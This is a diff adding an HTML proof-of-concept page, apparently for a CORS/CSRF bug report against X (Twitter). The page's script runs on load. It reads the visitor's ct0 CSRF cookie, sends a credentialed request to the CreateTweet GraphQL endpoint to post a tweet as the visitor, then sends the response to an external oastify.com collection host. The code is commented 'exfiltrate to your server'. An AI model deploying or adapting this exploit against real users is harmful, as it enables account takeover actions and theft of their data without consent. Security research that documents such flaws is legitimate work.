@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+async function exploit() {
+  const resp = await fetch(
+    "https://x.com/i/api/graphql/c50A_puUoQGK_4SXseYz3A/CreateTweet",
+    {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json",
+        "Authorization": "Bearer AAAAAAAAAAAAA...",
+        "X-Csrf-Token": document.cookie.match(/ct0=([^;]+)/)?.[1] || ""
+      },
+      body: JSON.stringify({
+        variables: {
+          tweet_text: "CORS PoC - posted from attacker.com",
+          media: { media_entities: [], possibly_sensitive: false },
+          semantic_annotation_ids: [],
+          disallowed_reply_options: null
+        },
+        features: {},
+        queryId: "c50A_puUoQGK_4SXseYz3A"
+      })
+    }
+  );
+  const data = await resp.json();
+  // exfiltrate to your server
+  fetch("https://c4hjr6atp7iqzuanoripe8hvmmsdg44t.oastify.com/leak?d=" + 
+    encodeURIComponent(JSON.stringify(data)));
+}
+exploit();
+</script>
+</body>
+</html>
